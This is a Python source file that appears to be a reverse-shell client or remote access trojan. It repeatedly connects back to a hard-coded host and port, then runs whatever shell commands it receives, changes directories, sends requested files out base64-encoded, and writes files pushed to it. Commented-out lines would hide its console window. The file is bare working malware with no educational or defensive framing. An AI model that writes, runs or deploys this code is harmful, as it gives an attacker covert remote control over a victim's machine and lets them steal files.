# -*- coding: utf-8 -*-
#import win32con
#import win32gui
import subprocess , socket
import os , base64
HOST = '127.0.0.1'
PORT = 3333
B_SIZE = 1024 * 1288
SEPARATOR = "_elf_"
#hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(hide , win32con.SW_HIDE)
def send(c2):
    name = c2
    files = open(name, 'rb+')
    data = files.read()
    send_data = base64.b64encode(data)
    f = s.send(send_data)
    files.close()
    s.send('file Sended..!'.encode())


def daryaft():
    while True:
        try:
            name_file = s.recv(B_SIZE).decode()
            if name_file == 'exit':
                break
            res = s.recv(B_SIZE)
            data = res
            file = base64.b64decode(res.decode())
            number=+1
            files = open(str(number)+"_file_elf_"+name_file, 'wb+')
            files.write(file)
        except:
            pass
   
def command():
    while True:
        c1 = s.recv(B_SIZE).decode()
        if c1 == 'exit':
            break
        if c1[0].lower() == "c":
            try:

                os.chdir(''.join(c1[1:]))
                cwd = os.getcwd()
                sms = f"{SEPARATOR}{cwd}"
                s.send(sms.encode())
            except FileNotFoundError as e:
                o = str(e)
                s.send(o.encode())
        else:
            o = subprocess.getoutput(c1)
            cwd = os.getcwd()
            sms = f"{o}{SEPARATOR}{cwd}"
            s.send(sms.encode())
    
while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        break
    except:
        pass
cwd = os.getcwd()

s.send(cwd.encode())

while True:

    c1 = s.recv(B_SIZE).decode()
    sc = c1.split()
    if c1 == 'download':
        c2 = s.recv(B_SIZE).decode()
        send(c2)
        
    if c1.lower() == 'upload':
        
        daryaft()
    
    if c1.lower() == "exit":

        break

    if sc[0].lower() == "cd":

        try:

            os.chdir(' '.join(sc[1:]))
            cwd = os.getcwd()
            sms = f"{SEPARATOR}{cwd}"
            s.send(sms.encode())
        except FileNotFoundError as e:

            o = str(e)

        else:

            o = ""
    if c1.lower() == 'command':
        command()
